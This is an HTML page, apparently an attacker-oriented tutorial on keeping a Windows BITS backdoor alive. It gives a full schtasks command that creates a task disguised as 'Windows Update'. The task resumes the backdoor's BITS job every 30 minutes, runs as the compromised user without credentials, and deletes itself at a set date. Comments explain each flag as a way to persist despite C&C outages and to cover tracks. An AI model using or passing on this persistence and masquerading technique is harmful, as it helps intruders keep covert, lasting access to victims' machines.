<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Priming BITS Wtih schtasks</title>
</head><body>To solve the problem of BITS entering an error state, we use schtasks to resume our job at regular intervals. This will allow our backdoor to persist regardless of the state of our C&amp;C, or presence of a trigger-file.<br/>
<br/>
Crafting our Scheduled Task<br/>
schtasks /CREATE /TN "Windows Update" /TR "%WINDIR%\system32\sbitsadmin.exe /resume \"Windows Update\"" /SC minute /MO 30 /ED 03/14/2014 /ET 09:00 /Z /IT /RU %USERNAME%<br/>
<br/>
Important Settings:<br/>
# The /resume flag will restart our BITS job if it has entered an error state<br/>
/TR %WINDIR%\system32\sbitsadmin.exe /resume...<br/>
<br/>
# Utilizing a "schedule modifier" we create a task whose actions will trigger every X minutes.<br/>
/SC minute /MO &lt;X&gt;<br/>
<br/>
# Using an end date and end time we set an expiration date for our task<br/>
/ED &lt;DATE&gt; /ET &lt;TIME&gt;<br/>
<br/>
# Using the /Z flag causes our task to self delete at the specified end date and time<br/>
/Z<br/>
<br/>
# Run as %USERNAME% executes our task under a compromised user without need for credentials<br/>
/IT /RU %USERNAME%<br/>
<br/>
<br/>
Our Newly Created Task<br/>
This task will automatically delete itself once it has reached the end date and time.<br/>
<img src="image.png" /><br/>
<br/>
</body></html>